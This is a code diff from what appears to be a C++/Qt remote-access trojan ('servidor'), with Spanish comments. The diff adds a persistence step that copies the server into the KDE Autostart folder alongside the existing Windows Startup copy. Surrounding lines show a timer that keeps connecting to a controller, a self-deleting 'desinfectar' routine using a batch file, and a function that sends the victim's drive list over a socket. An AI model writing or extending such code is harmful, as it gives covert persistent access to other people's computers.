@@ -80,9 +80,15 @@ void MainWindow::inicio(){
     {
         datos = datos + "noejecutar|@|0|@|"; //Sino decimos al servidor copiado que no ejecute nada
     }
+    #ifdef Q_WS_WIN
     if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
         copiarServidor(datos,QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + this->nombreCopiable);
     }
+    #else
+    if (directorio.exists(QDir::homePath() + "/.kde/Autostart/")) { //Kubuntu
+        copiarServidor(datos,QDir::homePath() + "/.kde/Autostart/" + this->nombreCopiable);
+    }
+    #endif
     temporizador.start(this->tiempoConexion); //iniciar el temporizador para conexiÃ³n
     connect(&temporizador,SIGNAL(timeout()),this,SLOT(conectar())); //cada "tiempoConexion" intentar conectar
     connect(&socket,SIGNAL(readyRead()),this,SLOT(llegadaDatos()));
@@ -538,9 +544,8 @@ void MainWindow::desinfectar()
     archivoBat.write(bat);
     archivoBat.close();
     QProcess::startDetached("borrar.bat");
-    QApplication::exit();
     #endif
-
+    QApplication::exit();
 }
 void MainWindow::listarUnidades()
 {  /** Esta función envia por socket una lista de las unidades de almacenamiento del sistema **/
